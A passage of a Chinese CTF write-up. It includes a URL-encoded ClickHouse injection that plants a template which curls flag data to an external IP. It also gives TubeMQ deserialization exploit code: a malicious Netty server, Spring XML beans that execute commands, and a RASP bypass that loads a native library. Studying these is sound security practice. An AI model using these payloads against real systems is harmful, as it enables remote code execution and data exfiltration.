%64%25%32%37%25%36%64%25%37%35%25%36%63%25%37%34%25%36%39%25%37%30%25%36%31%25%37%32%25%37%34%25%32%66%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%36%34%25%36%31%25%37%34%25%36%31%25%33%62%25%32%30%25%36%32%25%36%66%25%37%35%25%36%65%25%36%34%25%36%31%25%37%32%25%37%39%25%33%64%25%32%64%25%32%64%25%32%64%25%32%64%25%37%34%25%36%35%25%37%33%25%37%34%25%32%37%25%32%63%25%32%37%25%35%38%25%32%64%25%34%31%25%36%33%25%36%33%25%36%35%25%37%33%25%37%33%25%32%64%25%35%34%25%36%66%25%36%62%25%36%35%25%36%65%25%32%37%25%33%64%25%32%37%25%33%38%25%33%37%25%33%33%25%36%34%25%33%34%25%33%33%25%33%37%25%36%31%25%33%33%25%36%31%25%33%39%25%33%38%25%36%32%25%33%37%25%33%30%25%33%35%25%36%33%25%33%35%25%36%31%25%33%33%25%36%33%25%36%31%25%33%37%25%36%33%25%33%35%25%33%30%25%33%33%25%36%34%25%33%30%25%33%30%25%33%30%25%36%35%25%32%37%25%32%39%25%32%39%25%32%30%25%35%36%25%36%31%25%36%63%25%37%35%25%36%35%25%37%33%25%32%38%25%32%37%25%32%30%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%37%34%25%36%35%25%37%33%25%37%34%25%35%63%25%37%32%25%35%63%25%36%65%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%34%25%36%39%25%37%33%25%37%30%25%36%66%25%37%33%25%36%39%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%36%34%25%36%31%25%37%34%25%36%31%25%33%62%25%32%30%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%32%32%25%36%64%25%37%39%25%36%36%25%36%39%25%36%63%25%36%35%25%32%32%25%33%62%25%32%30%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%32%32%25%32%65%25%32%65%25%32%66%25%37%34%25%36%35%25%36%64%25%37%30%25%36%63%25%36%31%25%37%34%25%36%35%25%37%33%25%32%66%25%36%35%25%37%38%25%37%30%25%32%65%25%36%38%25%37%34%25%36%64%25%36%63%25%32%32%25%35%63%25%37%32%25%35%63%25%36%65%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%37%34%25%36%35%25%37%38%25%37%34%25%32%66%25%37%30%25%36%63%25%36%31%25%36%39%25%36%65%25%35%63%25%37%32%25%35%63%25%36%65%25%35%63%25%37%32%25%35%63%25%36%65%25%32%34%25%36%33%25%36%66%25%36%34%25%36%35%25%33%61%25%35%63%25%37%32%25%35%63%25%36%65%25%30%39%25%35%66%25%35%66%25%36%39%25%36%64%25%37%30%25%36%66%25%37%32%25%37%34%25%35%66%25%35%66%25%32%38%25%35%63%25%32%37%25%36%66%25%37%33%25%35%63%25%32%37%25%32%39%25%32%65%25%37%33%25%37%39%25%37%33%25%37%34%25%36%35%25%36%64%25%32%38%25%35%63%25%32%37%25%36%33%25%37%35%25%37%32%25%36%63%25%32%30%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%38%25%32%65%25%33%31%25%33%33%25%33%30%25%32%65%25%33%32%25%33%34%25%32%65%25%33%31%25%33%38%25%33%38%25%33%61%25%33%37%25%33%37%25%33%37%25%33%35%25%32%66%25%33%66%25%36%36%25%36%63%25%36%31%25%36%37%25%33%64%25%36%30%25%32%66%25%37%32%25%36%35%25%36%31%25%36%34%25%36%36%25%36%63%25%36%31%25%36%37%25%32%30%25%37%63%25%32%30%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%36%30%25%35%63%25%32%37%25%32%39%25%35%63%25%37%32%25%35%63%25%36%65%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%37%34%25%36%35%25%37%33%25%37%34%25%32%64%25%32%64%25%32%37%25%32%39%25%33%62&#x27;,CSV,&#x27;a String&#x27;))</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703668345521-ae3d7658-15b3-436b-8e62-220737479eb6.png#averageHue=%23030201&clientId=u05cfb51f-4d9a-4&from=paste&height=161&id=ud1a97185&originHeight=161&originWidth=909&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14620&status=done&style=none&taskId=ue3132878-44df-4ec9-adfb-a2c3d688279&title=&width=909" alt="image.png"><br>最后访问index渲染exp模板<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703668642217-e90ac71f-0f7f-453c-ad32-c957559efe93.png#averageHue=%232c2b2b&clientId=u05cfb51f-4d9a-4&from=paste&height=262&id=u5df16a54&originHeight=262&originWidth=943&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15691&status=done&style=none&taskId=u6a2b5f3f-e0ca-4ee8-a363-04724dafdb7&title=&width=943" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703668636225-42dce3d1-c5a9-4677-9116-ce4f8d55ac92.png#averageHue=%23302f2e&clientId=u05cfb51f-4d9a-4&from=paste&height=377&id=u0aa680d9&originHeight=377&originWidth=886&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48037&status=done&style=none&taskId=u0f403720-badd-413a-869e-e842f12690c&title=&width=886" alt="image.png"><br>成功获得flag。<code>nctf&#123;hacking_clickhouse_database_qkh7ZrPqHK2GVHky&#125;</code></p>
<h1 id="EvilMQ"><a href="#EvilMQ" class="headerlink" title="EvilMQ"></a>EvilMQ</h1><p>和ActiveMQ类似的漏洞。TubeMQ的漏洞<br>第二题决定就先做这题了，感觉这题好玩。但是环境搭建是真的不好玩。环境搭建2小时，做题20分钟。<br><a target="_blank" rel="noopener" href="https://github.com/apache/inlong/tree/master/inlong-tubemq/tubemq-core/src/main/java/org/apache/inlong/tubemq">https://github.com/apache/inlong/tree/master/inlong-tubemq/tubemq-core/src/main/java/org/apache/inlong/tubemq</a><br>先搭建一下服务端<br>项目在这，直接git拉下来就可以了，然后用IDEA打开inlong项目<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703586603302-cf023b49-8390-441c-8316-7e91891b0249.png#averageHue=%2330343c&clientId=ubd264d06-77f6-4&from=paste&height=1152&id=u21b5459c&originHeight=1440&originWidth=2560&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=289486&status=done&style=none&taskId=ueb3742f3-2bb7-4e48-b7c2-90ab006a2b0&title=&width=2048" alt="image.png"><br>然后耐心的等待IDEA的加载。。。。加载完毕后我们需要运行一下Core项目里的<code>proto:compile</code>，在maven里去运行，然后就会生成3个RPC生成的Java文件（并且注意项目及子项目目录名称不能为中文）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703586666063-3b3bb659-e0d8-4d03-ab65-68a7b4fd0391.png#averageHue=%233e3322&clientId=ubd264d06-77f6-4&from=paste&height=266&id=u123b396a&originHeight=332&originWidth=515&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20963&status=done&style=none&taskId=u3253763b-3f93-4c81-8f1b-767b87b0adf&title=&width=412" alt="image.png"><br>然后把这三个文件放到<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703586686538-d9c1666a-2051-458c-904d-3f109170b512.png#averageHue=%232c2f34&clientId=ubd264d06-77f6-4&from=paste&height=401&id=uf806680f&originHeight=501&originWidth=570&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29198&status=done&style=none&taskId=ud042ee35-1c89-4426-b2bf-7ea512b690a&title=&width=456" alt="image.png"><br>定义了grpc里的protobuf，我也不知道是不是自己的方法笨，反正我觉得搭建的好困难。搭建完毕后我们就可以自行启动一个grpc server<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703586741654-742f1b8d-572b-47f9-b6d2-e4e381f7ddb2.png#averageHue=%232a2e35&clientId=ubd264d06-77f6-4&from=paste&height=286&id=u0117997d&originHeight=357&originWidth=1442&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=96540&status=done&style=none&taskId=ud60a664e-381a-4735-ae85-49ece473fd0&title=&width=1153.6" alt="image.png"><br>自己加入一个主函数就好了，运行后会在9999启动一个grpc server。之后我们就可以开启调试模式自行测试了。假如是远程情况的也不是很复杂，你把这个Nettyserver所需的一些Java文件都整合起来，然后打个Jar包也是一样的。<br>至此我们开始我们的分析，漏洞点也是出现在<code>org.apache.inlong.tubemq.corerpc.netty.NettyClient</code>，TubeMQ是基于Netty的，Netty的handler需要重写channleRead方法，我们直接给上断点。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703597145789-cf5dd9e6-3ea0-4802-bd44-6222a1a4909a.png#averageHue=%23587977&clientId=ubd264d06-77f6-4&from=paste&height=183&id=u2256e5fe&originHeight=229&originWidth=1504&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60495&status=done&style=none&taskId=u8f199481-b5b4-4eb6-a730-99ef94e53f9&title=&width=1203.2" alt="image.png"><br>漏洞点是其中的<code>MixUtils.unwrapException</code>，我们之前的ApacheMQ是<code>BaseDataStreamMarshalle.createThrowable</code>，都是在异常处理这块有实例化任意方法的点位。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703597222585-17b10125-9a8d-4de3-8f4b-1d1e8fbb4595.png#averageHue=%232e323d&clientId=ubd264d06-77f6-4&from=paste&height=466&id=uec83bc7e&originHeight=582&originWidth=1691&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=122963&status=done&style=none&taskId=uf4554f9e-b3f3-49c2-8d1e-f75b694f9e2&title=&width=1352.8" alt="image.png"><br>当我们与恶意的Server进行交互时，server这边可以控制你的<code>strExceptionMsgSet</code><br>服务端如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703597263174-95566354-c03a-4db9-b892-87cefd148141.png#averageHue=%232a2e37&clientId=ubd264d06-77f6-4&from=paste&height=426&id=ud90d085d&originHeight=533&originWidth=1516&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=116841&status=done&style=none&taskId=u5ce10747-00e2-47c1-af72-06ab15451f6&title=&width=1212.8" alt="image.png"><br>客户端如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703597283939-a5ebe0c4-d269-4327-9a29-567be999e80d.png#averageHue=%232f323a&clientId=ubd264d06-77f6-4&from=paste&height=522&id=u4c21f2c4&originHeight=653&originWidth=1619&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=137205&status=done&style=none&taskId=ued8a499b-b8b1-463d-b12f-bee36570ad6&title=&width=1295.2" alt="image.png"><br>可以看到client这边接收到了evil server返回的2个字符串，那么这里只需要控制这2个字符串为CPX类，完成实例化加载XML文件就结束了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> &#123;</span><br><span class="line">         logger.debug(<span class="string">&quot;server message receive!&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span> (!(msg <span class="keyword">instanceof</span> RpcDataPack)) &#123;</span><br><span class="line">             <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         logger.debug(<span class="string">&quot;server RpcDataPack message receive!&quot;</span>);</span><br><span class="line">         <span class="type">RpcDataPack</span> <span class="variable">dataPack</span> <span class="operator">=</span> (RpcDataPack) msg;</span><br><span class="line">         RPCProtos.RpcConnHeader connHeader;</span><br><span class="line">         RPCProtos.RequestHeader requestHeader;</span><br><span class="line">         RPCProtos.RequestBody rpcRequestBody;</span><br><span class="line">         <span class="type">int</span> <span class="variable">rmtVersion</span> <span class="operator">=</span> RpcProtocol.RPC_PROTOCOL_VERSION;</span><br><span class="line">         <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> ctx.channel();</span><br><span class="line">         <span class="keyword">if</span> (channel == <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="type">String</span> <span class="variable">rmtaddrIp</span> <span class="operator">=</span> getRemoteAddressIP(channel);</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="keyword">if</span> (!isServiceStarted()) &#123;</span><br><span class="line">                 <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServerNotReadyException</span>(<span class="string">&quot;RpcServer is not running yet&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">             List&lt;ByteBuffer&gt; req = dataPack.getDataLst();</span><br><span class="line">             <span class="type">ByteBufferInputStream</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteBufferInputStream</span>(req);</span><br><span class="line">             connHeader = RPCProtos.RpcConnHeader.parseDelimitedFrom(dis);</span><br><span class="line">             requestHeader = RPCProtos.RequestHeader.parseDelimitedFrom(dis);</span><br><span class="line">             rmtVersion = requestHeader.getProtocolVer();</span><br><span class="line">             rpcRequestBody = RPCProtos.RequestBody.parseDelimitedFrom(dis);</span><br><span class="line">         &#125; <span class="keyword">catch</span> (Throwable e1) &#123;</span><br><span class="line">             <span class="keyword">if</span> (!(e1 <span class="keyword">instanceof</span> ServerNotReadyException)) &#123;</span><br><span class="line">                 <span class="keyword">if</span> (rmtaddrIp != <span class="literal">null</span>) &#123;</span><br><span class="line">                     <span class="type">AtomicLong</span> <span class="variable">count</span> <span class="operator">=</span> errParseAddrMap.get(rmtaddrIp);</span><br><span class="line">                     <span class="keyword">if</span> (count == <span class="literal">null</span>) &#123;</span><br><span class="line">                         <span class="type">AtomicLong</span> <span class="variable">tmpCount</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicLong</span>(<span class="number">0</span>);</span><br><span class="line">                         count = errParseAddrMap.putIfAbsent(rmtaddrIp, tmpCount);</span><br><span class="line">                         <span class="keyword">if</span> (count == <span class="literal">null</span>) &#123;</span><br><span class="line">                             count = tmpCount;</span><br><span class="line">                         &#125;</span><br><span class="line">                     &#125;</span><br><span class="line">                     count.incrementAndGet();</span><br><span class="line">                     <span class="type">long</span> <span class="variable">befTime</span> <span class="operator">=</span> lastParseTime.get();</span><br><span class="line">                     <span class="type">long</span> <span class="variable">curTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">                     <span class="keyword">if</span> (curTime - befTime &gt; <span class="number">180000</span>) &#123;</span><br><span class="line">                         <span class="keyword">if</span> (lastParseTime.compareAndSet(befTime, System.currentTimeMillis())) &#123;</span><br><span class="line">                             logger.warn(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="number">512</span>)</span><br><span class="line">                                     .append(<span class="string">&quot;[Abnormal Visit] Abnormal Message Content visit list is :&quot;</span>)</span><br><span class="line">                                     .append(errParseAddrMap).toString());</span><br><span class="line">                             errParseAddrMap.clear();</span><br><span class="line">                         &#125;</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             List&lt;ByteBuffer&gt; res =</span><br><span class="line">                     prepareResponse(<span class="literal">null</span>, rmtVersion, RPCProtos.ResponseHeader.Status.FATAL,</span><br><span class="line">                             e1.getClass().getName(), <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="number">512</span>)</span><br><span class="line">                                     .append(<span class="string">&quot;IPC server unable to read call parameters:&quot;</span>)</span><br><span class="line">                                     .append(e1.getMessage()).toString());</span><br><span class="line">             <span class="keyword">if</span> (res != <span class="literal">null</span>) &#123;</span><br><span class="line">                 dataPack.setDataLst(res);</span><br><span class="line">                 channel.writeAndFlush(dataPack);</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Throwable</span>(<span class="string">&quot;Boogipop&quot;</span>);</span><br><span class="line">             <span class="comment">//RequestWrapper requestWrapper =</span></span><br><span class="line">             <span class="comment">//        new RequestWrapper(requestHeader.getServiceType(),</span></span><br><span class="line">             <span class="comment">//                this.protocolType, requestHeader.getProtocolVer(),</span></span><br><span class="line">             <span class="comment">//                connHeader.getFlag(), rpcRequestBody.getTimeout());</span></span><br><span class="line">             <span class="comment">//requestWrapper.setMethodId(rpcRequestBody.getMethod());</span></span><br><span class="line">             <span class="comment">//requestWrapper.setRequestData(PbEnDecoder.pbDecode(true,</span></span><br><span class="line">             <span class="comment">//        rpcRequestBody.getMethod(), rpcRequestBody.getRequest().toByteArray()));</span></span><br><span class="line">             <span class="comment">//requestWrapper.setSerialNo(dataPack.getSerialNo());</span></span><br><span class="line">             <span class="comment">//RequestContext context =</span></span><br><span class="line">             <span class="comment">//        new NettyRequestContext(requestWrapper, ctx, System.currentTimeMillis());</span></span><br><span class="line">             <span class="comment">//protocols.get(this.protocolType).handleRequest(context, rmtaddrIp);</span></span><br><span class="line">         &#125; <span class="keyword">catch</span> (Throwable ee) &#123;</span><br><span class="line">             List&lt;ByteBuffer&gt; res =</span><br><span class="line">                     prepareResponse(<span class="literal">null</span>, rmtVersion, RPCProtos.ResponseHeader.Status.FATAL,</span><br><span class="line">                             <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/bean.xml&quot;</span>);</span><br><span class="line">             <span class="keyword">if</span> (res != <span class="literal">null</span>) &#123;</span><br><span class="line">                 dataPack.setDataLst(res);</span><br><span class="line">                 ctx.channel().writeAndFlush(dataPack);</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>xml准备如下。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;data&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>PAYLOAD<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703597539774-da6dd61e-2aaf-49f7-863c-d3bb4c34ea0d.png#averageHue=%232e3239&clientId=ubd264d06-77f6-4&from=paste&height=689&id=u151f1d35&originHeight=861&originWidth=1564&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=215816&status=done&style=none&taskId=u7ef11d92-c6d6-431a-a21f-30eb7bfcd9d&title=&width=1251.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703597677942-27f3000b-3728-4f6c-81e0-31fe3a6d2d0f.png#averageHue=%23485151&clientId=ubd264d06-77f6-4&from=paste&height=567&id=u775a0e5e&originHeight=709&originWidth=1557&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1090125&status=done&style=none&taskId=u1368704f-be7d-429a-b093-80dc6661b2b&title=&width=1245.6" alt="image.png"><br>由于会通信数次，所以会弹出很多计算机。然后题目其实是有一个RASP的，hook了forkexec，这里是底层做的事情，但是这个rasp只有linux可以用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703597896860-607ae9b0-3080-480c-9ade-71f66e3608d6.png#averageHue=%23292d36&clientId=ubd264d06-77f6-4&from=paste&height=267&id=u450126bf&originHeight=334&originWidth=1581&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=86341&status=done&style=none&taskId=u5181651c-aa98-4824-98c0-1d4826ac08a&title=&width=1264.8" alt="image.png"><br>他hook的是UNIXProcess。这里解决方法很多，可以参考官方wp里给的2个。<br>我比较喜欢这个<br><a target="_blank" rel="noopener" href="https://www.jrasp.com/guide/technology/native_method.html">https://www.jrasp.com/guide/technology/native_method.html</a><br>这里讲到了rasp hook native function方法的一个原理。是给native func加一个前缀，所以我们反射调用修改后的名字即可。<br>还有一种方法是load so文件，直接System.load,题目并没有做任何过滤。攻击代码如下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;data&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>PAYLOAD<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;#</span></span></span><br><span class="line"><span class="string"><span class="tag">&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;com.example.Evil&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">T(org.springframework.util.Base64Utils).decodeFromString(data),new</span></span></span><br><span class="line"><span class="string"><span class="tag">javax.management.loading.MLet(new</span></span></span><br><span class="line"><span class="string"><span class="tag">java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).n</span></span></span><br><span class="line"><span class="string"><span class="tag">ewInstance()&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;PAYLOAD&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;/tmp/evil.so&quot;</span>;</span><br><span class="line">Files.write(Paths.get(filename), Base64.getDecoder().decode(data));</span><br><span class="line">System.load(filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>恶意类如上。总而言之我觉得这题很有意义，XZ师傅太强拉~</p>
<h1 id="wait-what"><a href="#wait-what" class="headerlink" title="wait what"></a>wait what</h1><p>114出的</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 